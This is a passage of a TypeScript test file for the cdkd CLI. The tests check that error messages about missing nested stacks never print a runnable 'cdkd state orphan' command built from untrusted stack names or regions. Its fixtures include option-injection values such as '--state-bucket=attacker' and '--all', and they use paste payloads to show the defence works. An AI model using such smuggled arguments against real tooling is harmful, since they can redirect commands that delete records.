    'never hands over a pasteable orphan command built from a logical id carrying %s (go-to-k/cdkd#3328)',
    async (_, logicalId, assertOn) => {
      // `walkCdkdStateStackTree` mints each child's stack name as
      // `${parent}~${logicalId}` from `Object.keys(state.resources)` — body
      // content anyone with `s3:PutObject` on one key chooses — and RECURSES,
      // so from depth 2 the `stackName` this refusal names is itself derived.
      // That is the reachable shape: at depth 1 the name is the caller's own,
      // so a single-level fixture cannot exercise the command at all.
      const hostileChild = `Root~${logicalId}`;
      const root = makeState({
        stackName: 'Root',
        region: 'us-east-1',
        resources: { [logicalId]: { resourceType: 'AWS::CloudFormation::Stack' } },
      });
      // The hostile-named child EXISTS and itself lists a nested row whose
      // record does not, so the refusal fires one level down with the derived
      // name as its subject.
      const child = makeState({
        stackName: hostileChild,
        region: 'us-east-1',
        resources: { Grandchild: { resourceType: 'AWS::CloudFormation::Stack' } },
      });
      const backend = makeStateBackendMock({
        'Root|us-east-1': root,
        [`${hostileChild}|us-east-1`]: child,
      }) as S3StateBackend;

      const thrown = await buildCdkdStateStackTree('Root', 'us-east-1', backend).catch(
        (e: unknown) => e
      );

      const message = (thrown as Error).message;
      expect(message).toContain('missing nested-child');
      assertOn(message);
    }
  );

  it.each([
    ['the STACK NAME', '--state-bucket=attacker', 'us-east-1'],
    ['the REGION', 'Root', '--state-bucket=attacker'],
  ])(
    'withholds the orphan command when %s begins with a - (go-to-k/cdkd#3499 M8)',
    async (_, rootName, region) => {
      // The value renders EXACTLY, so the raw compare admits it. As the STACK
      // NAME, the shell strips the quotes `shellQuote` adds and Commander reads
      // the positional as the FLAG, pointing a record-DELETING command at an
      // attacker-named bucket. As the REGION it is `--stack-region`'s value,
      // which Commander takes as given (measured); the gate refuses it
      // conservatively all the same. The cases drive the ROOT name and the region
      // because this site passes the PARENT's `stackName` to the builder, not
      // the child's — not because a derived name cannot start with `-`, which
      // it can when its own root does (m16 of the go-to-k/cdkd#3499 review).
      const root = makeState({
        stackName: rootName,
        region,
        resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
      });
      const backend = makeStateBackendMock({ [`${rootName}|${region}`]: root }) as S3StateBackend;

      const thrown = await buildCdkdStateStackTree(rootName, region, backend).catch(
        (e: unknown) => e
      );

      const message = (thrown as Error).message;
      expect(message).toContain('missing nested-child');
      expect(message).toContain("cdkd state orphan '<stack>' --stack-region '<region>'");
      expect(message).not.toMatch(/cdkd state orphan [^\n]*--state-bucket=attacker/);
      // The note names the value the gate withheld and its reason, and only
      // that one: a note keyed on a predicate of its own would name both.
      const isRegion = rootName === 'Root';
      const named = isRegion ? 'region' : 'stack name';
      const other = isRegion ? 'stack name' : 'region';
      // Only the POSITIONAL parses as a flag; Commander takes the word after
      // `--stack-region` as its value, so the region's sentence claims less.
      const why = isRegion
        ? "begins with a '-', which cdkd refuses to print as an argument"
        : "begins with a '-', which 'cdkd state orphan' could parse as a flag";
      expect(message).toContain(
        `The next line's command names neither value, because its record's ${named} ${why}.`
      );
      expect(message).not.toContain(`record's ${other}`);
      expect(message).not.toContain(`its ${other}`);
      // Never "fill the hole" for a STACK NAME: `'--all'` parses as the option
      // in the positional whatever the quoting, so that instruction would
      // rebuild the command. The region's hole is a flag value, safe to fill.
      const noFill =
        'repair or remove the one whose stackName and region match by hand — this stack name ' +
        "begins with a '-' and could parse as an option in that position, so do not fill a " +
        'hole with it.';
      if (isRegion) {
        expect(message).not.toContain(noFill);
        expect(message).toContain('replacing each quoted hole');
      } else {
        expect(message).toContain(noFill);
        expect(message).not.toContain('replacing each quoted hole');
      }
      expect(message.endsWith("cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(true);
    }
  );

  it('withholds a REGION that renders exactly but is not a plain identifier, naming only it (go-to-k/cdkd#3997)', async () => {
    const region = 'us-east-1 x';
    const root = makeState({
      stackName: 'Root',
      region,
      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
    });
    const backend = makeStateBackendMock({ [`Root|${region}`]: root }) as S3StateBackend;
    const message = (
      (await buildCdkdStateStackTree('Root', region, backend).catch((e: unknown) => e)) as Error
    ).message;
    expect(message).toContain(
      "The next line's command names neither value, because its record's region is not a plain " +
        "identifier (a letter or digit, then letters, digits, '~', '_', '.' or '-'), which cdkd " +
        'does not print on a command line.'
    );
    // Only the region: the stack name is plain and is not blamed.
    expect(message).not.toContain('stack name is not a plain identifier');
    // A region is a flag's value, so its hole may be filled.
    expect(message).toContain('replacing each quoted hole');
    expect(message.endsWith("cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(true);
  });

  it.each([
    ['stack name', 'q'.repeat(STACK_REF_MAX_CODE_POINTS + 1), 'us-east-1', 'is too long to print'],
    ['region', 'Root', '', 'is empty'],
  ])(
    "renders the gate's reason for a withheld %s (go-to-k/cdkd#3436)",
    async (what, rootName, region, why) => {
      const root = makeState({
        stackName: rootName,
        region,
        resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
      });
      const backend = makeStateBackendMock({ [`${rootName}|${region}`]: root }) as S3StateBackend;

      const thrown = await buildCdkdStateStackTree(rootName, region, backend).catch(
        (e: unknown) => e
      );

      const message = (thrown as Error).message;
      expect(message).toContain(
        `The next line's command names neither value, because its record's ${what} ${why}.`
      );
      expect(message.endsWith("cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(true);
    }
  );

  it('never says to fill the stack hole with a name beginning with -, whatever reason withheld it (go-to-k/cdkd#3436)', async () => {
    // The gate reports `too-long` before `option-shaped`, so the recovery
    // instruction cannot be keyed on the reason alone.
    const rootName = `--${'x'.repeat(STACK_REF_MAX_CODE_POINTS)}`;
    const root = makeState({
      stackName: rootName,
      region: 'us-east-1',
      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
    });
    const backend = makeStateBackendMock({ [`${rootName}|us-east-1`]: root }) as S3StateBackend;

    const thrown = await buildCdkdStateStackTree(rootName, 'us-east-1', backend).catch(
      (e: unknown) => e
    );

    const message = (thrown as Error).message;
    // And when the gate calls it ALTERED first (a zero-width space).
    const alteredName = '--all\u200b';
    const altered = makeState({
      stackName: alteredName,
      region: 'us-east-1',
      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
    });
    const alteredThrown = await buildCdkdStateStackTree(
      alteredName,
      'us-east-1',
      makeStateBackendMock({ [`${alteredName}|us-east-1`]: altered }) as S3StateBackend
    ).catch((e: unknown) => e);
    expect((alteredThrown as Error).message).toContain("its record's stack name does NOT render exactly");
    expect((alteredThrown as Error).message).toContain('so do not fill a hole with it.');
    expect((alteredThrown as Error).message).not.toContain('replacing each quoted hole');
    expect(message).toContain("its record's stack name is too long to print.");
    // The tail says WHY the no-fill rule applies, since the reason above is
    // the cap, not the dash (m3 of the go-to-k/cdkd#3924 review).
    expect(message).toContain(
      "this stack name begins with a '-' and could parse as an option in that position, so do " +
        'not fill a hole with it.'
    );
    expect(message).not.toContain('replacing each quoted hole');
  });

  it('names a stack name AT the cap, so the too-long refusal is the cap and not a shorter bound', async () => {
    const rootName = 'q'.repeat(STACK_REF_MAX_CODE_POINTS);
    const root = makeState({
      stackName: rootName,
      region: 'us-east-1',
      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
    });
    const backend = makeStateBackendMock({ [`${rootName}|us-east-1`]: root }) as S3StateBackend;

    const thrown = await buildCdkdStateStackTree(rootName, 'us-east-1', backend).catch(
      (e: unknown) => e
    );

    expect(
      (thrown as Error).message.endsWith(
        `\nDrop it with: cdkd state orphan ${rootName} --stack-region us-east-1`
      )
    ).toBe(true);
  });

  it('answers the reason orphanCommandFor cannot reach with a true sentence, not a throw (go-to-k/cdkd#3924 m2)', () => {
    // A throw would escape the state-deletion warn's `catch` (M4's hazard).
    // `not-plain` IS reachable since go-to-k/cdkd#3997 and has its own sentence.
    for (const positional of [true, false]) {
      expect(orphanWithholdWhy('pattern-shaped', positional)).toBe(
        "cannot be printed as an argument to 'cdkd state orphan'"
      );
      expect(orphanWithholdWhy('not-plain', positional)).toBe(
        "is not a plain identifier (a letter or digit, then letters, digits, '~', '_', '.' or '-'), which " +
          'cdkd does not print on a command line'
      );      // Unreachable too (the gate is `plainIdent`, which answers `not-plain`),
      // answered with the shared sentence (go-to-k/cdkd#4205).
      expect(orphanWithholdWhy('shell-active', positional)).toBe(SHELL_ACTIVE_WHY);
    }
  });

  it('fails CLOSED on a non-string stack name instead of throwing (go-to-k/cdkd#3924 M4)', async () => {
    // `unknown` in, handed to the gate unconverted: a non-string is withheld,
    // and the leading-`-` check must not call `.startsWith` on it.
    const rootName = 123 as unknown as string;
    const root = makeState({
      stackName: rootName,
      region: 'us-east-1',
      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
    });
    const backend = makeStateBackendMock({ '123|us-east-1': root }) as S3StateBackend;

    const thrown = await buildCdkdStateStackTree(rootName, 'us-east-1', backend).catch(
      (e: unknown) => e
    );

    const message = (thrown as Error).message;
    expect(thrown).not.toBeInstanceOf(TypeError);
    expect(message).toContain("because its record's stack name is not a string.");
    expect(message.endsWith("\nDrop it with: cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(
      true
    );
  });

  it('names BOTH withheld values in one note when both are refused (go-to-k/cdkd#3436)', async () => {
    const rootName = '--all';
    const region = 'us-east-1\u200b';
    const root = makeState({
      stackName: rootName,
      region,
      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
    });
    const backend = makeStateBackendMock({ [`${rootName}|${region}`]: root }) as S3StateBackend;

    const thrown = await buildCdkdStateStackTree(rootName, region, backend).catch(
      (e: unknown) => e
    );

    expect((thrown as Error).message).toContain(
      "The next line's command names neither value, because its record's stack name begins " +
        "with a '-', which 'cdkd state orphan' could parse as a flag; and its region does NOT " +
        'render exactly (another record may render identically).'
    );
  });

  it("pastes nothing runnable from the nested-child refusal, head included, named or withheld (go-to-k/cdkd#3436, go-to-k/cdkd#3950)", async () => {
    const messages: string[] = [];
    for (const { value } of PASTE_PAYLOADS) {
      for (const rootName of [value, `-${value}`]) {
        const root = makeState({
          stackName: rootName,
          region: 'us-east-1',
          resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
        });
        const backend = makeStateBackendMock({ [`${rootName}|us-east-1`]: root }) as S3StateBackend;
        const thrown = await buildCdkdStateStackTree(rootName, 'us-east-1', backend).catch(
          (e: unknown) => e
        );
        const message = (thrown as Error).message;
        // Each case's PREMISE, pinned before the paste: a payload name is
        // WITHHELD as not a plain identifier (go-to-k/cdkd#3997); its
        // `-`-leading twin is withheld with the no-fill note above. Inert
        // spans alone would pass a gate that stopped withholding.
        expect(message).toContain(
          rootName === value
            ? "is not a plain identifier (a letter or digit, then letters, digits, '~', '_', '.' or '-'), which cdkd does not print on a command line."
            : 'so do not fill a hole with it.'
        );
        expect(message).toContain(
          "\nDrop it with: cdkd state orphan '<stack>' --stack-region '<region>'"
        );
        messages.push(message);
      }
    }
    withPasteDir((dir) => {
      for (const message of messages) {
        expect(message).toContain('missing nested-child');
        expect(message).toContain('cdkd state orphan');
        // The WHOLE message. The head used to render record values inside
        // hand-written `'...'` and was excluded here by name; since
        // go-to-k/cdkd#3950 it describes a name that is not a plain
        // identifier, so nothing in it runs either.
        expect(message).toContain(
          'cdkd state is missing nested-child (not shown: it is not a plain identifier)'
        );
        expect(spansThatRun(message, dir), message).toEqual([]);
      }
    });
  }, 120_000);

  /**
   * THE INSTRUMENT, after three review rounds each found another site.
   *
   * go-to-k/cdkd#3328's rounds 3, 4 and 5 hardened six renderings of a
   * record-derived stack name in this file, one at a time, and each round found
   * the next by accident. A seventh would have been found the same way or not at
   * all, so this is a check rather than a seventh sentence.
   *
   * TWO populations share it since go-to-k/cdkd#3371. The names
   * `walkCdkdStateStackTree` MINTS from a record's `resources` keys
   * (`${parent}~${logicalId}`) and the fields carried beside them; and the
   * template- and CLI-derived identifiers — a template logical id, the
   * synthesized or typed stack name, the CloudFormation stack name, a
   * `--stack-region` value. Both reach a line an operator pastes from.
   *
   * RAW includes the retired `safeSegment(...)`: it sanitized and capped but
   * kept `'`, `$`, `(` and a space, so a value it printed still ran once a
   * pasted selection reached it (go-to-k/cdkd#4205). A name renders through
   * `quotedOrNotShown` (sentences), `displayIdent` (list rows) or the shared
   * command gate.
   *
   * ITS LIMIT, stated because naming these bindings does not close their class:
   * a value crossing a helper's RETURN (`const targetRegion = await
   * pickStackRegion(...)`) has no carrier on its right-hand side, so nothing
   * here can DERIVE it — those bindings are listed by hand below. When adding a
   * helper that returns such a value, add its binding here too.
   *
   * The record's `physicalId` / `properties` / `attributes` are body content at
   * the same trust boundary and have their own case below (go-to-k/cdkd#3375).
   */
  it('renders no record-, template- or CLI-derived name RAW in any message (go-to-k/cdkd#3328, go-to-k/cdkd#3371)', async () => {
    const { readFileSync } = await import('node:fs');
    const { fileURLToPath } = await import('node:url');
    const source = readFileSync(
      fileURLToPath(new URL('../../../src/cli/commands/export.ts', import.meta.url)),
      'utf-8'
    );

    // Derived from the CODE in BOTH directions: the receivers this file reads a
    // name off, AND the property names that name is CARRIED under. The minted
    // name travels node `.stackName` -> `PerStackImportNode.cdkdStackName` ->
    // `PerStackPlan.cdkdName` -> `importedStacks[].cdkdStackName`; the template
    // and CLI ones as `.logicalId`, `.cfnName`, `.cfnStackName`,
    // `.consumerStackName` and `.outputName`.
    const carriers = [
      'stackName',
      'region',
      'cdkdStackName',
      'cdkdName',
      'logicalId',
      'cfnName',
      'cfnStackName',
      'consumerStackName',
      'outputName',
      'childLogicalId',
      // A receiver's `.resourceType` (a template `Type`, `Custom::<anything>`
      // among them) in a row. The bare `${resourceType}` is not watched: every
      // remaining site sits behind a lookup keyed by cdkd's own constants, or
      // after a DescribeType that ANSWERED for that Type. The one that fired
      // exactly when DescribeType REJECTED it (`fetchPrimaryIdentifier`'s
      // no-fallback refusal) renders through `quotedOrNotShown` (S1 of the
      // go-to-k/cdkd#4245 review).
      'resourceType',
      // G3 of the same review: a failure row's `.type`, a cross-stack row's
      // `.location`, and the next-steps block's `.cdkStackName`.
      'type',
      'location',
      'cdkStackName',
    ];
    const receivers = [
      ...new Set(
        [...source.matchAll(new RegExp(`\\b(\\w+)\\.(?:${carriers.join('|')})\\b`, 'g'))].map(
          (m) => m[1] as string
        )
      ),
    ];
    // NO allow-list and NO exclusions: a new receiver joins by being WRITTEN.
    // The parameter bags go-to-k/cdkd#3328 excluded (`options`, `deps`, ...)
    // carry go-to-k/cdkd#3371's CLI-supplied population, so they are watched
    // too.
    expect(receivers.length).toBeGreaterThanOrEqual(10);

    const identifiers = [
      ...receivers.flatMap((r) => carriers.map((c) => `${r}.${c}`)),
      // The BARE bindings the same values are destructured or bound into.
      'childStackName',
      'cdkdName',
      'parentStackName',
      'row.childStackName',
      'node.state.parentStack',
      // A record-derived value crossing a helper's RETURN into a local:
      // `pickStackRegion`'s answer, whose LEGACY branch returns the record
      // BODY's `region`.
      'targetRegion',
      'rootRegion',
      // go-to-k/cdkd#3371: template- and CLI-derived bindings.
      'logicalId',
      'childLogicalId',
      'resolvedStackName',
      'cfnStackName',
      'rootStackName',
      'stackName',
      'region',
      'cfnName',
      'stackArg',
      'flag',
      // Operator-typed values the parsers and helpers bind under their own
      // names (review of go-to-k/cdkd#4245): the `--parameter` token and name,
      // the `--cfn-child-stack-name` value, a `-c` value, the template path,
      // the state bucket, and a template Parameter key.
      't',
      'name',
      'raw',
      'v',
      'path',
      'bucket',
      'uploadOpts.stateBucket',
      'parameterKey',
    ];
    const escaped = (id: string): string => id.replace('.', '\\.');
    const raw = identifiers.flatMap((id) =>
      [
        ...source.matchAll(new RegExp(`\\$\\{(?:safeSegment\\()?${escaped(id)}\\)?\\}`, 'g')),
      ]
        .map((m) => ({ id, at: m.index ?? 0 }))
        // A value printed only on the arm where the shared `isPasteableIdent`
        // gate admitted it (the nested resume tail's CloudFormation name).
        .filter(
          ({ at }) =>
            !new RegExp(`isPasteableIdent\\(${escaped(id)}\\)\\s*\\?\\s*$`).test(
              source.slice(Math.max(0, at - 120), at).replace(/`[^`]*$/, '')
            )
        )
        // A doc or line COMMENT quoting the shape is not a message.
        .filter(({ at }) => !/^\s*(?:\*|\/\/)/.test(source.slice(source.lastIndexOf('\n', at) + 1, at)))
        // A template literal used as a DATA value rather than as a message:
        // `childStackName: \`${parentStackName}~${logicalId}\`` MINTS the name
        // and the upload key `stackName: \`${plan.cdkdName}__nested__...\`` is an
        // S3 object name. Neither is something a terminal renders, and
        // sanitizing either would change the VALUE rather than its rendering.
        // Anchored on the property assignment, so it exempts only a literal
        // that IS the value of a `*[Ss]tackName` key.
        .filter(({ at }) => !/\b\w*[Ss]tackName: `[^`]*$/.test(source.slice(Math.max(0, at - 80), at)))
        // The minting assignment itself (`const childStackName = \`...\``).
        .filter(({ at }) => !/\bconst \w*[Ss]tackName = `[^`]*$/.test(source.slice(Math.max(0, at - 80), at)))
        // The literal handed WHOLE to `quotedOrNotShown` (go-to-k/cdkd#3950),
        // which prints it only when `displayIdent` leaves the assembled text
        // unchanged: the state-key paths.
        .filter(({ at }) => !/quotedOrNotShown\(`[^`]*$/.test(source.slice(Math.max(0, at - 80), at)))
        .map(({ id, at }) => `${id} at offset ${at}`)
    );

    expect(raw, 'a derived name is interpolated without a boundary').toEqual([]);
    // A bare `displayIdent(<derived name>)` is not a boundary either: its JSON
    // quotes leave `$( )` live when pasted (go-to-k/cdkd#4229's decision). A
    // name renders through `quotedOrNotShown`, `plainOrNotShown` or `rowIdent`
    // (both of which DESCRIBE a value that is not plain and inert)
    // (which shell-bounds the JSON form). G2 of the go-to-k/cdkd#4245 review.
    // AWS-derived values are exempt by NAME: an SSM-reported `got.type`.
    const AWS_DERIVED = new Set(['got.type']);
    const bareDisplay = identifiers
      .filter((id) => !AWS_DERIVED.has(id))
      .flatMap((id) =>
        [...source.matchAll(new RegExp(`displayIdent\\(${escaped(id)}\\b`, 'g'))].map(
          (m) => `${id} at offset ${m.index ?? 0}`
        )
      );
    // Non-vacuity: the SAME pattern finds the one exempt site, so a regex that
    // stopped matching fails here instead of passing over nothing.
    expect(
      [...source.matchAll(new RegExp(`displayIdent\\(${escaped('got.type')}\\b`, 'g'))]
        .length
    ).toBeGreaterThanOrEqual(1);
    expect(bareDisplay, 'a derived name is rendered through a bare displayIdent').toEqual([]);
    // And the retired renderer does not come back under another spelling.
    expect(source).not.toMatch(/\bsafeSegment\(/);

    // The INDIRECTION the literal match cannot see: a list of such names
    // reduced to a string and interpolated as one. A WINDOW around each
    // `.join(`, not a parsed map/join pair: the shapes in this file wrap across
    // lines, carry a `.slice()` between them, and put parentheses inside the
    // callback's template literal, all of which a structural regex got wrong in
    // three different ways. The window is crude and it is what the
    // non-vacuity floor keeps honest.
    const joinWindows = [...source.matchAll(/\.join\(/g)].map(({ index }) =>
      source.slice(Math.max(0, (index ?? 0) - 220), index ?? 0)
    );
    // `result.stacks` (the Cloud Assembly's own list) is no longer excluded:
    // its names are go-to-k/cdkd#3371's population.
    const carrierJoins = joinWindows.filter((w) =>
      carriers.some((c) => new RegExp(`\\.${c}\\b`).test(w))
    );
    expect(carrierJoins.length).toBeGreaterThanOrEqual(4);
    // Lists bound under their own names: template Parameter names (`missing`,
    // `missingNested`, `skipped`, `params`, `[...known]`) and `--parameter`
    // names (`stray`).
    const namedJoins = joinWindows.filter((w) =>
      /\b(?:missing|missingNested|skipped|stray|params|known)\b[^\n]*$/.test(w.slice(-60))
    );
    expect(namedJoins.length).toBeGreaterThanOrEqual(6);
    // Anchored at the END of the window, the list's own `.map`: a boundary
    // elsewhere in the window (a neighbour's `quotedOrNotShown(cdkdName)`)
    // must not satisfy it.
    expect(
      namedJoins.filter(
        (w) =>
          !/\b(?:missing|missingNested|skipped|stray|params|known)\]?\.map\(\(\s*(\w+)\s*\)\s*=>\s*quotedOrNotShown\(\1\)\s*\)$/.test(
            w
          )
      ),
      'a list of template- or CLI-derived names is joined into a message without a boundary'
    ).toEqual([]);
    expect(
      carrierJoins.filter(
        (w) => !/safeDetail\(|quotedOrNotShown\(|regionListMember\(|rowIdent\(/.test(w)
      ),
      'a list of derived names is joined into a message without a boundary'
    ).toEqual([]);
  });

  /**
   * The BODY-value half of the class (go-to-k/cdkd#3375): every interpolation
   * that READS a record's `physicalId`, a `properties[...]` / `attributes[...]`
   * value or a `resourceIdentifier` / `propertiesOverlay` map goes through a
   * renderer that gives it a boundary and a cap.
   *
   * ITS LIMITS, the same kind the case above states: it matches NAMES inside a
   * `${...}`, so it cannot see a value that reaches a message under another
   * name — split out of a physical id into a local (`segment`, `vpcId`,
   * `tuple.groupId`), bound by a loop (`printPlan`'s `v`, the overlay's
   * `value`), returned by a helper — or one appended with `+` rather than
   * interpolated, or an interpolation whose expression holds a `{` or a
   * backtick. Those sites are pinned per message in
   * `export-record-value-display.test.ts` and `export-plan-record-display.test.ts`.
   * `displayAwsMessage` is deliberately NOT an accepted renderer: it bounds a
   * value but gives it no boundary.
   */
  it('renders no record BODY value without a boundary in any message (go-to-k/cdkd#3375)', async () => {
    const { readFileSync } = await import('node:fs');
    const { fileURLToPath } = await import('node:url');
    const source = readFileSync(
      fileURLToPath(new URL('../../../src/cli/commands/export.ts', import.meta.url)),
      'utf-8'
    );
    // One regex PER BRANCH, each with its own floor where the tree has sites,
    // so one broken branch cannot hide behind another's matches
    // (go-to-k/cdkd#3910). `attributes[`, `resourceIdentifier` and
    // `propertiesOverlay` have NO interpolated site today — every such value
    // reaches a message through a local — so they carry no floor: they stay
    // watched, and the first site they match gets the boundary requirement.
    const branches: Array<{ name: string; re: RegExp; floor: number }> = [
      { name: 'physicalId', re: /\bphysicalId\b/, floor: 20 },
      { name: 'properties[', re: /\bproperties\[/, floor: 1 },
      { name: 'attributes[', re: /\battributes\[/, floor: 0 },
      { name: 'resourceIdentifier', re: /\bresourceIdentifier\b/, floor: 0 },
      { name: 'propertiesOverlay', re: /\bpropertiesOverlay\b/, floor: 0 },
    ];
    const rendered = /^(?:showRecordValue|recordValueOrNotShown|preDeletedLine|commandHole)\(/;
    const all = [...source.matchAll(/\$\{([^{}`]*)\}/g)]
      .map((m) => ({ expr: (m[1] as string).trim(), at: m.index ?? 0 }))
      // `Object.keys(...)` of a `resourceIdentifier` lists the splitter's own
      // field-name constants, never a recorded value.
      .filter(({ expr }) => !expr.startsWith('Object.keys('));
    for (const { name, re, floor } of branches) {
      const hits = all.filter(({ expr }) => re.test(expr) && rendered.test(expr));
      expect(hits.length, `rendered sites for the ${name} branch`).toBeGreaterThanOrEqual(floor);
    }
    const interpolations = all.filter(({ expr }) => branches.some(({ re }) => re.test(expr)));
    expect(
      interpolations
        .filter(({ expr }) => !rendered.test(expr))
        .map(({ expr, at }) => `${expr} at offset ${at}`),
      'a record body value is interpolated without a boundary'
    ).toEqual([]);
  });

  it('skips the root-state fetch when prefetchedRootState is supplied', async () => {
    // The orchestrator typically loads the root state via
    // `stateBackend.getState` before invoking `buildCdkdStateStackTree`.
    // The fast-path optional argument lets the walker reuse that
    // already-loaded state instead of paying a second S3 round-trip.
    const root = makeState({
      stackName: 'Root',
      region: 'us-east-1',
      resources: { Bucket: { resourceType: 'AWS::S3::Bucket' } },
    });
    let rootFetchCount = 0;
    const backend = {
      async getState(stackName: string, region: string) {
        if (stackName === 'Root' && region === 'us-east-1') {
          rootFetchCount++;
          return { state: root, etag: '"mock"', migrationPending: undefined };
        }
        return null;
      },
    } as unknown as S3StateBackend;
    const tree = await buildCdkdStateStackTree('Root', 'us-east-1', backend, root);
    expect(rootFetchCount).toBe(0);
    expect(tree.state).toBe(root);
  });
});

describe('flattenCdkdStateTreeLeafFirst (issue #464 PR B1)', () => {
  it('returns a single entry for a leaf-only tree', () => {
    const tree: CdkdStateStackTree = {
      stackName: 'Root',
      region: 'us-east-1',
      state: makeState({ stackName: 'Root', region: 'us-east-1' }),
      nestedChildren: new Map(),
    };
    expect(flattenCdkdStateTreeLeafFirst(tree)).toEqual([
      { stackName: 'Root', region: 'us-east-1' },
    ]);
  });

  it('orders leaves before parent (DFS post-order)', () => {
    const grand: CdkdStateStackTree = {
      stackName: 'Root~Child~Grand',
      region: 'us-east-1',
      state: makeState({ stackName: 'Root~Child~Grand', region: 'us-east-1' }),
      nestedChildren: new Map(),
    };
    const child: CdkdStateStackTree = {
      stackName: 'Root~Child',
      region: 'us-east-1',
      state: makeState({ stackName: 'Root~Child', region: 'us-east-1' }),
      nestedChildren: new Map([['Grand', grand]]),
    };
    const root: CdkdStateStackTree = {
      stackName: 'Root',
      region: 'us-east-1',
      state: makeState({ stackName: 'Root', region: 'us-east-1' }),
      nestedChildren: new Map([['Child', child]]),
    };
    expect(flattenCdkdStateTreeLeafFirst(root)).toEqual([
      { stackName: 'Root~Child~Grand', region: 'us-east-1' },
      { stackName: 'Root~Child', region: 'us-east-1' },
      { stackName: 'Root', region: 'us-east-1' },
    ]);
  });

  it('preserves sibling iteration order across multiple children', () => {
    const a: CdkdStateStackTree = {
      stackName: 'Root~A',
      region: 'us-east-1',
      state: makeState({ stackName: 'Root~A', region: 'us-east-1' }),
      nestedChildren: new Map(),
    };
    const b: CdkdStateStackTree = {
      stackName: 'Root~B',
      region: 'us-east-1',
      state: makeState({ stackName: 'Root~B', region: 'us-east-1' }),
      nestedChildren: new Map(),
    };
    const root: CdkdStateStackTree = {
      stackName: 'Root',
      region: 'us-east-1',
      state: makeState({ stackName: 'Root', region: 'us-east-1' }),
      nestedChildren: new Map([
        ['A', a],
        ['B', b],
      ]),
    };
    expect(flattenCdkdStateTreeLeafFirst(root)).toEqual([
      { stackName: 'Root~A', region: 'us-east-1' },
      { stackName: 'Root~B', region: 'us-east-1' },
      { stackName: 'Root', region: 'us-east-1' },
    ]);
  });
});

describe('buildImportPlan — nested-stack rows (issue #464 PR B1)', () => {
  // `cfnClient` is only consulted by the identifier-resolution path; the
  // nested-stack branch short-circuits before that. A stub that throws on
  // any `send` call is sufficient + documents the contract.
  const cfnClientStub = {
    send: () => {
      throw new Error('cfnClient.send should not be called for nested-stack-only templates');
    },
  } as unknown as AwsClients['cloudFormation'];

  // Issue #2274: a record whose properties hold the REDACTION MASK is not
  // exportable. `***` is what cdkd persists where a `NoEcho` custom resource's
  // `Data` was resolved into a property, and there is nothing to re-derive the
  // real value from -- so an exported template would DECLARE the mask, which
  // CloudFormation would either refuse at IMPORT (the template must describe
  // the live resource) or write onto it at the next update.
  it('BLOCKS a resource whose state holds the redaction mask (issue #2274)', async () => {
    const state = makeState({
      stackName: 'Root',
      region: 'us-east-1',
      resources: { Param: { resourceType: 'AWS::SSM::Parameter' } },
    });
    state.resources['Param']!.properties = { Name: '/app/token', Value: '***' };
    const template = {
      Resources: {
        Param: { Type: 'AWS::SSM::Parameter', Properties: { Name: '/app/token', Value: 'x' } },
      },
    };

    const result = await buildImportPlan(state, template, cfnClientStub, 'Root');

    expect(result.blocked).toHaveLength(1);
    expect(result.blocked[0]!.logicalId).toBe('Param');
    expect(result.blocked[0]!.reason).toMatch(/redaction mask/);
    expect(result.phase1Imports).toEqual([]);
    // THREE POPULATIONS reach this blocker since issue #2881 (two since issue
    // #2847, and naming only the NoEcho one was a measured defect at the
    // deploy engine's twin before it was one here). This blocker tests
    // `properties`, while `CloudControlProvider.import` masks only
    // `attributes`, so arm (3) is about a mask COPIED here from another
    // record — by `cdkd orphan --force`,
    // or by `cdkd import` resolving an `Fn::GetAtt` or a `Ref` over an
    // already-masked value. Neither has a custom resource anywhere near it,
    // and every remedy the original sentence offered was custom-resource-only.
    expect(result.blocked[0]!.reason).toMatch(/NoEcho/);
    expect(result.blocked[0]!.reason).toMatch(/cdkd import/);
    expect(result.blocked[0]!.reason).toMatch(/cloudformation:DescribeType/);
    // THE PROPOSITION THAT DISTINGUISHES THIS ARM FROM ITS PREDECESSOR (issue
    // #2847 round-4 review, gap T-G2). The three needles above are carried by
    // BOTH the current wording and the round-3-REJECTED one, so restoring
    // "the record was adopted through the Cloud Control fallback" was measured
    // GREEN here too. Same fence as the rollback executor's twin, because the
    // two messages state the same proposition.
    expect(result.blocked[0]!.reason).toMatch(/SPLICED from a masked record of ANOTHER resource/);
    expect(result.blocked[0]!.reason).toMatch(/'cdkd orphan --force'/);
    // The `Ref` route the narrowed wording omitted — under the opt-in it is the
    // CANONICAL `cdkd import` route to a masked property.
    expect(result.blocked[0]!.reason).toMatch(/Fn::GetAtt or a Ref/);
    // NEGATIVE, paired with the positives above so it cannot pass by absence.
    // THE FENCE'S BOUND, measured rather than assumed (issue #2847 round-5
    // review). It catches the RETIRED sentence and near variants -- proved by
    // a probe that ADDS the wrong claim beside the right one, which reds -- but
    // a PARAPHRASE evades it: `This row came from a Cloud Control import, so
    // re-import THIS resource.` beside the correct arm is GREEN. That residual
    // is inherent to any wording fence and is stated here so a reader does not
    // take this negative for a total one; what makes the arm hard to get wrong
    // again is the positive above, which pins the proposition.
    expect(result.blocked[0]!.reason).not.toMatch(
      /(record|baseline)[^.]{0,40}(written|adopted)[^.]{0,40}(Cloud Control|cdkd import)/i
    );
  });

  // Issue #2881: a THIRD writer reaches this blocker. `resolveBase64` registers
  // the encoding of a secret as a mask-only needle, so a deploy persists `***`
  // in `properties` (pinned by `deploy-engine-base64-secret-noop.test.ts`:
  // `properties.Value === '***'`), with no custom resource anywhere near it.
  // Both remedies the message offered before are wrong for it: there is no
  // NoEcho to stop setting, and every deploy masks the encoding again.
  it('names the Fn::Base64 encoding of a secret as a cause, with a remedy no deploy replaces (issue #2881)', async () => {
    const state = makeState({
      stackName: 'Root',
      region: 'us-east-1',
      resources: { Ud: { resourceType: 'AWS::SSM::Parameter' } },
    });
    // The shape a deploy records for `Value: { 'Fn::Base64': '...{{resolve:...}}' }`.
